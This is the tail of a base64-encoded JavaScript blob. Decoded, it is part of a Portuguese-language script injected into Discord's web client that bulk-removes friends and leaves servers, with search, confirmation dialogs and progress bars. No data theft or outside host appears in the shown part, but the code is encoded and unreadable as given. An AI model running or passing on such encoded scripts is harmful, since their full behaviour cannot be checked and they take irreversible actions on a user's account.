zdERlbGF5KSk7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYCR7c2VsZWN0ZWQubGVuZ3RofSBhbWlnb3MgcmVtb3ZpZG9zIGNvbSBzdWNlc3NvIWAsICdzdWNjZXNzJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICk7CiAgICAgICAgfTsKCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlbW92ZS1hbGwtZnJpZW5kcycpLm9uY2xpY2sgPSBhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGFsbEZyaWVuZHMgPSBBcnJheS5mcm9tKGNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgnLmRmbS1mcmllbmQnKSk7CiAgICAgICAgICAgIGlmICghYWxsRnJpZW5kcy5sZW5ndGgpIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ05lbmh1bSBhbWlnbyBwYXJhIHJlbW92ZXIhJywgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgc2hvd0NvbmZpcm1Nb2RhbCgKICAgICAgICAgICAgICAgIGBBVEVOw4fDg08hIFZvY8OqIGVzdMOhIHByZXN0ZXMgYSByZW1vdmVyIFRPRE9TIG9zICR7YWxsRnJpZW5kcy5sZW5ndGh9IGFtaWdvcyFcblxuRXN0YSBhw6fDo28gbsOjbyBwb2RlIHNlciBkZXNmZWl0YSFgLAogICAgICAgICAgICAgICAgYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzTW9kYWwgPSBjcmVhdGVQcm9ncmVzc01vZGFsKCdSZW1vdmVuZG8gVG9kb3Mgb3MgQW1pZ29zJywgYWxsRnJpZW5kcy5sZW5ndGgpOwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CgogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzVGV4dCA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI3Byb2dyZXNzLXRleHQnKTsKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI3Byb2dyZXNzLWJhcicpOwoKICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFsbEZyaWVuZHMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZWwgPSBhbGxGcmllbmRzW2ldOwogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCByZW1vdmVGcmllbmQoZWwuZGF0YXNldC5pZCwgZWwuZGF0YXNldC5uYW1lLCBlbC5kYXRhc2V0LmF2YXRhcik7CiAgICAgICAgICAgICAgICAgICAgICAgIGVsLnJlbW92ZSgpOwoKICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlUHJvZ3Jlc3MocHJvZ3Jlc3NUZXh0LCBwcm9ncmVzc0JhciwgaSArIDEsIGFsbEZyaWVuZHMubGVuZ3RoLCAnYW1pZ29zJyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHByb2dyZXNzTW9kYWwucmVtb3ZlKCk7CiAgICAgICAgICAgICAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9ImZyaWVuZHMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIGFtaWdvcy4uLiI+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZW1wdHkiPk5lbmh1bSBhbWlnbyBlbmNvbnRyYWRvPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgYDsKICAgICAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCdUb2RvcyBvcyBhbWlnb3MgZm9yYW0gcmVtb3ZpZG9zIScsICdzdWNjZXNzJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICk7CiAgICAgICAgfTsKICAgIH07CgogICAgY29uc3QgcmVuZGVyU2VydmVycyA9IChzZXJ2ZXJzLCBzZWFyY2hUZXJtID0gJycpID0+IHsKICAgICAgICBjb25zdCBjb250ZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NlcnZlcnMtdGFiJyk7CiAgICAgICAgY29uc3QgZmlsdGVyZWRTZXJ2ZXJzID0gc2VydmVycy5maWx0ZXIocyA9PiAhcy5vd25lcik7CiAgICAgICAgY29uc3QgZmlsdGVyZWRBbmRTZWFyY2hlZCA9IGZpbHRlckl0ZW1zKGZpbHRlcmVkU2VydmVycywgc2VhcmNoVGVybSk7CgogICAgICAgIGlmICghZmlsdGVyZWRBbmRTZWFyY2hlZC5sZW5ndGgpIHsKICAgICAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9InNlcnZlcnMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIHNlcnZpZG9yZXMuLi4iIHZhbHVlPSIke3NlYXJjaFRlcm19Ij4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+JHtzZWFyY2hUZXJtID8gJ05lbmh1bSBzZXJ2aWRvciBlbmNvbnRyYWRvIHBhcmEgZXN0YSBidXNjYScgOiAnTmVuaHVtIHNlcnZpZG9yIGVuY29udHJhZG8nfTwvZGl2PgogICAgICAgIGA7CiAgICAgICAgICAgIGlmIChzZWFyY2hUZXJtKSB7CiAgICAgICAgICAgICAgICBjb250ZW50LnF1ZXJ5U2VsZWN0b3IoJyNzZXJ2ZXJzLXNlYXJjaCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2lucHV0JywgKGUpID0+IHJlbmRlclNlcnZlcnMoc2VydmVycywgZS50YXJnZXQudmFsdWUpKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBjb250ZW50LmlubmVySFRNTCA9IGAKICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VhcmNoLWNvbnRhaW5lciI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9InNlcnZlcnMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIHNlcnZpZG9yZXMuLi4iIHZhbHVlPSIke3NlYXJjaFRlcm19Ij4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tYWN0aW9ucyI+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4gc2Vjb25kYXJ5IiBpZD0icmVmcmVzaC1zZXJ2ZXJzIj5BdHVhbGl6YXIgTGlzdGE8L2J1dHRvbj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biIgaWQ9ImxlYXZlLXNlbGVjdGVkLXNlcnZlcnMiPlNhaXIgZG9zIFNlbGVjaW9uYWRvczwvYnV0dG9uPgogICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuIGRhbmdlciIgaWQ9ImxlYXZlLWFsbC1zZXJ2ZXJzIj5TYWlyIGRlIFRvZG9zPC9idXR0b24+CiAgICAgICAgPC9kaXY+CiAgICAgICAgJHtmaWx0ZXJlZEFuZFNlYXJjaGVkLm1hcChzID0+IHsKICAgICAgICAgICAgY29uc3QgaWNvblVybCA9IHMuaWNvbiA/IGBodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9pY29ucy8ke3MuaWR9LyR7cy5pY29ufS5wbmdgIDogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2VtYmVkL2F2YXRhcnMvMC5wbmcnOwogICAgICAgICAgICByZXR1cm4gYAogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlcnZlciIgZGF0YS1pZD0iJHtzLmlkfSIgZGF0YS1uYW1lPSIke3MubmFtZX0iIGRhdGEtaWNvbj0iJHtpY29uVXJsfSI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iZGZtLWNoZWNrYm94Ij4KICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSJkZm0tc2VydmVyLWljb24iIHNyYz0iJHtpY29uVXJsfSIgb25lcnJvcj0idGhpcy5zcmM9J2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2VtYmVkL2F2YXRhcnMvMC5wbmcnIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0taW5mbyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1uYW1lIj4ke3MubmFtZX08L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VydmVyLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tbGVhdmUtc2VydmVyIj5TYWlyPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgYDsKICAgICAgICB9KS5qb2luKCcnKX0KICAgIGA7CgogICAgICAgIGNvbnN0IHNlYXJjaElucHV0ID0gY29udGVudC5xdWVyeVNlbGVjdG9yKCcjc2VydmVycy1zZWFyY2gnKTsKICAgICAgICBsZXQgc2VhcmNoVGltZW91dDsKICAgICAgICBzZWFyY2hJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdpbnB1dCcsIChlKSA9PiB7CiAgICAgICAgICAgIGNsZWFyVGltZW91dChzZWFyY2hUaW1lb3V0KTsKICAgICAgICAgICAgc2VhcmNoVGltZW91dCA9IHNldFRpbWVvdXQoKCkgPT4gcmVuZGVyU2VydmVycyhzZXJ2ZXJzLCBlLnRhcmdldC52YWx1ZSksIDMwMCk7CiAgICAgICAgfSk7CiAgICAgICAgc2VhcmNoSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcigna2V5cHJlc3MnLCAoZSkgPT4gewogICAgICAgICAgICBpZiAoZS5rZXkgPT09ICdFbnRlcicpIHsKICAgICAgICAgICAgICAgIGNsZWFyVGltZW91dChzZWFyY2hUaW1lb3V0KTsKICAgICAgICAgICAgICAgIHJlbmRlclNlcnZlcnMoc2VydmVycywgZS50YXJnZXQudmFsdWUpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CgogICAgICAgIGNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgnLmRmbS1jaGVja2JveCcpLmZvckVhY2goY2hlY2tib3ggPT4gewogICAgICAgICAgICBjaGVja2JveC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCAoZSkgPT4gewogICAgICAgICAgICAgICAgZS50YXJnZXQuY2xvc2VzdCgnLmRmbS1zZXJ2ZXInKS5jbGFzc0xpc3QudG9nZ2xlKCdzZWxlY3RlZCcsIGUudGFyZ2V0LmNoZWNrZWQpOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLWxlYXZlLXNlcnZlcicpLmZvckVhY2goYnRuID0+IHsKICAgICAgICAgICAgYnRuLm9uY2xpY2sgPSBhc3luYyBlID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IGVsID0gZS50YXJnZXQuY2xvc2VzdCgnLmRmbS1zZXJ2ZXInKTsKICAgICAgICAgICAgICAgIGNvbnN0IGJ1dHRvbiA9IGUudGFyZ2V0OwogICAgICAgICAgICAgICAgYnV0dG9uLmRpc2FibGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGJ1dHRvbi50ZXh0Q29udGVudCA9ICdTYWluZG8uLi4nOwogICAgICAgICAgICAgICAgYXdhaXQgbGVhdmVTZXJ2ZXIoZWwuZGF0YXNldC5pZCwgZWwuZGF0YXNldC5uYW1lLCBlbC5kYXRhc2V0Lmljb24pOwogICAgICAgICAgICAgICAgZWwucmVtb3ZlKCk7CiAgICAgICAgICAgIH07CiAgICAgICAgfSk7CgogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdyZWZyZXNoLXNlcnZlcnMnKS5vbmNsaWNrID0gYXN5bmMgKCkgPT4gewogICAgICAgICAgICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVmcmVzaC1zZXJ2ZXJzJyk7CiAgICAgICAgICAgIGJ0bi5kaXNhYmxlZCA9IHRydWU7CiAgICAgICAgICAgIGJ0bi50ZXh0Q29udGVudCA9ICdBdHVhbGl6YW5kby4uLic7CiAgICAgICAgICAgIGNvbnN0IHNlcnZlcnNEYXRhID0gYXdhaXQgZmV0Y2hTZXJ2ZXJzKCk7CiAgICAgICAgICAgIHJlbmRlclNlcnZlcnMoc2VydmVyc0RhdGEsIHNlYXJjaElucHV0LnZhbHVlKTsKICAgICAgICAgICAgYnRuLmRpc2FibGVkID0gZmFsc2U7CiAgICAgICAgICAgIGJ0bi50ZXh0Q29udGVudCA9ICdBdHVhbGl6YXIgTGlzdGEnOwogICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCdMaXN0YSBhdHVhbGl6YWRhIGNvbSBzdWNlc3NvIScsICdzdWNjZXNzJyk7CiAgICAgICAgfTsKCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xlYXZlLXNlbGVjdGVkLXNlcnZlcnMnKS5vbmNsaWNrID0gYXN5bmMgKCkgPT4gewogICAgICAgICAgICBjb25zdCBzZWxlY3RlZCA9IEFycmF5LmZyb20oY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLXNlcnZlci5zZWxlY3RlZCcpKTsKICAgICAgICAgICAgaWYgKCFzZWxlY3RlZC5sZW5ndGgpIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ1NlbGVjaW9uZSBwZWxvIG1lbm9zIHVtIHNlcnZpZG9yIScsICd3YXJuaW5nJyk7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHNob3dDb25maXJtTW9kYWwoCiAgICAgICAgICAgICAgICBgVGVtIGNlcnRlemEgcXVlIGRlc2VqYSBzYWlyIGRlICR7c2VsZWN0ZWQubGVuZ3RofSBzZXJ2aWRvcihlcyk/YCwKICAgICAgICAgICAgICAgIGFzeW5jICgpID0+IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc01vZGFsID0gY3JlYXRlUHJvZ3Jlc3NNb2RhbCgnU2FpbmRvIGRlIFNlcnZpZG9yZXMnLCBzZWxlY3RlZC5sZW5ndGgpOwogICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CgogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzVGV4dCA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI3Byb2dyZXNzLXRleHQnKTsKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI3Byb2dyZXNzLWJhcicpOwoKICAgICAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHNlbGVjdGVkLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVsID0gc2VsZWN0ZWRbaV07CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGxlYXZlU2VydmVyKGVsLmRhdGFzZXQuaWQsIGVsLmRhdGFzZXQubmFtZSwgZWwuZGF0YXNldC5pY29uKTsKICAgICAgICAgICAgICAgICAgICAgICAgZWwucmVtb3ZlKCk7CgogICAgICAgICAgICAgICAgICAgICAgICB1cGRhdGVQcm9ncmVzcyhwcm9ncmVzc1RleHQsIHByb2dyZXNzQmFyLCBpICsgMSwgc2VsZWN0ZWQubGVuZ3RoLCAnc2Vydmlkb3JlcycpOwogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgcmVxdWVzdERlbGF5KSk7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYCR7c2VsZWN0ZWQubGVuZ3RofSBzZXJ2aWRvcmVzIGFiYW5kb25hZG9zIGNvbSBzdWNlc3NvIWAsICdzdWNjZXNzJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICk7CiAgICAgICAgfTsKCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xlYXZlLWFsbC1zZXJ2ZXJzJykub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgYWxsU2VydmVycyA9IEFycmF5LmZyb20oY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLXNlcnZlcicpKTsKICAgICAgICAgICAgaWYgKCFhbGxTZXJ2ZXJzLmxlbmd0aCkgewogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbignTmVuaHVtIHNlcnZpZG9yIHBhcmEgc2FpciEnLCAnd2FybmluZycpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBzaG93Q29uZmlybU1vZGFsKAogICAgICAgICAgICAgICAgYEFURU7Dh8ODTyEgVm9jw6ogZXN0w6EgcHJlc3RlcyBhIHNhaXIgZGUgVE9ET1Mgb3MgJHthbGxTZXJ2ZXJzLmxlbmd0aH0gc2Vydmlkb3JlcyFcblxuRXN0YSBhw6fDo28gbsOjbyBwb2RlIHNlciBkZXNmZWl0YSFgLAogICAgICAgICAgICAgICAgYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzTW9kYWwgPSBjcmVhdGVQcm9ncmVzc01vZGFsKCdTYWluZG8gZGUgVG9kb3Mgb3MgU2Vydmlkb3JlcycsIGFsbFNlcnZlcnMubGVuZ3RoKTsKICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHByb2dyZXNzTW9kYWwpOwoKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy10ZXh0Jyk7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNwcm9ncmVzcy1iYXInKTsKCiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhbGxTZXJ2ZXJzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVsID0gYWxsU2VydmVyc1tpXTsKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgbGVhdmVTZXJ2ZXIoZWwuZGF0YXNldC5pZCwgZWwuZGF0YXNldC5uYW1lLCBlbC5kYXRhc2V0Lmljb24pOwogICAgICAgICAgICAgICAgICAgICAgICBlbC5yZW1vdmUoKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIHVwZGF0ZVByb2dyZXNzKHByb2dyZXNzVGV4dCwgcHJvZ3Jlc3NCYXIsIGkgKyAxLCBhbGxTZXJ2ZXJzLmxlbmd0aCwgJ3NlcnZpZG9yZXMnKTsKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgbmV3IFByb21pc2UociA9PiBzZXRUaW1lb3V0KHIsIHJlcXVlc3REZWxheSkpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgICAgICBjb250ZW50LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VhcmNoLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9InNlcnZlcnMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIHNlcnZpZG9yZXMuLi4iPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+TmVuaHVtIHNlcnZpZG9yIGVuY29udHJhZG88L2Rpdj4KICAgICAgICAgICAgICAgIGA7CiAgICAgICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbignVG9kb3Mgb3Mgc2Vydmlkb3JlcyBmb3JhbSBhYmFuZG9uYWRvcyEnLCAnc3VjY2VzcycpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApOwogICAgICAgIH07CiAgICB9OwoKICAgIGNvbnN0IGNyZWF0ZVByb2dyZXNzTW9kYWwgPSAodGl0bGUsIHRvdGFsKSA9PiB7CiAgICAgICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICBtb2RhbC5jbGFzc05hbWUgPSAnZGZtLW1vZGFsJzsKICAgICAgICBtb2RhbC5pbm5lckhUTUwgPSBgCiAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLWNvbnRlbnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbW9kYWwtdGl0bGUiPiR7dGl0bGV9PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1jb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLXRleHQiIGlkPSJwcm9ncmVzcy10ZXh0Ij4wLyR7dG90YWx9PC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtYmFyLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhciIgaWQ9InByb2dyZXNzLWJhciI+PC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICBgOwogICAgICAgIHJldHVybiBtb2RhbDsKICAgIH07CgogICAgY29uc3QgdXBkYXRlUHJvZ3Jlc3MgPSAodGV4dEVsZW1lbnQsIGJhckVsZW1lbnQsIGN1cnJlbnQsIHRvdGFsLCB0eXBlKSA9PiB7CiAgICAgICAgY29uc3QgcGVyY2VudCA9IChjdXJyZW50IC8gdG90YWwpICogMTAwOwogICAgICAgIHRleHRFbGVtZW50LnRleHRDb250ZW50ID0gYCR7dHlwZSA9PT0gJ2FtaWdvcycgPyAnUmVtb3ZlbmRvJyA6ICdTYWluZG8gZGUnfSAke2N1cnJlbnR9LyR7dG90YWx9ICR7dHlwZX1gOwogICAgICAgIGJhckVsZW1lbnQuc3R5bGUud2lkdGggPSBgJHtwZXJjZW50fSVgOwogICAgfTsKCiAgICB0cnkgewogICAgICAgIGNvbnN0IGZyaWVuZHNEYXRhID0gYXdhaXQgZmV0Y2hGcmllbmRzKCk7CiAgICAgICAgcmVuZGVyRnJpZW5kcyhmcmllbmRzRGF0YS5maWx0ZXIoZiA9PiBmLnR5cGUgPT09IDEpKTsKCiAgICAgICAgY29uc3Qgc2VydmVyc0RhdGEgPSBhd2FpdCBmZXRjaFNlcnZlcnMoKTsKICAgICAgICByZW5kZXJTZXJ2ZXJzKHNlcnZlcnNEYXRhKTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZyaWVuZHMtdGFiJykuaW5uZXJIVE1MID0gYAogICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJkZm0tc2VhcmNoIiBpZD0iZnJpZW5kcy1zZWFyY2giIHBsYWNlaG9sZGVyPSJCdXNjYXIgYW1pZ29zLi4uIj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZW1wdHkiPkVycm8gYW8gY2FycmVnYXIgYW1pZ29zPC9kaXY+CiAgICBgOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzZXJ2ZXJzLXRhYicpLmlubmVySFRNTCA9IGAKICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VhcmNoLWNvbnRhaW5lciI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9InNlcnZlcnMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIHNlcnZpZG9yZXMuLi4iPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+RXJybyBhbyBjYXJyZWdhciBzZXJ2aWRvcmVzPC9kaXY+CiAgICBgOwogICAgICAgIHNob3dOb3RpZmljYXRpb24oJ0Vycm8gYW8gY2FycmVnYXIgZGFkb3MnLCAnZXJyb3InKTsKICAgIH0KCmNvbnN0IHN0YXJ0QnV0dG9uTW9uaXRvciA9ICgpID0+IHsKICAgIGNyZWF0ZURpc2NvcmRNYW5hZ2VyQnV0dG9uKCk7CiAgICAKICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgIGNvbnN0IGV4aXN0aW5nQnV0dG9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Rpc2NvcmQtbWFuYWdlci1uYXYtYnV0dG9uJyk7CiAgICAgICAgaWYgKGV4aXN0aW5nQnV0dG9uKSB7CiAgICAgICAgICAgIHNob3dCdXR0b25IaWdobGlnaHQoZXhpc3RpbmdCdXR0b24pOwogICAgICAgIH0KICAgIH0sIDUwMCk7CgogICAgc2V0SW50ZXJ2YWwoKCkgPT4gewogICAgICAgIGNvbnN0IGJ1dHRvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkaXNjb3JkLW1hbmFnZXItbmF2LWJ1dHRvbicpOwogICAgICAgIGlmICghYnV0dG9uKSB7CiAgICAgICAgICAgIGNyZWF0ZURpc2NvcmRNYW5hZ2VyQnV0dG9uKCk7CiAgICAgICAgfQogICAgfSwgMzAwMCk7Cn07CgpzZXRUaW1lb3V0KHN0YXJ0QnV0dG9uTW9uaXRvciwgMTUwMCk7Cn0pKCk7");
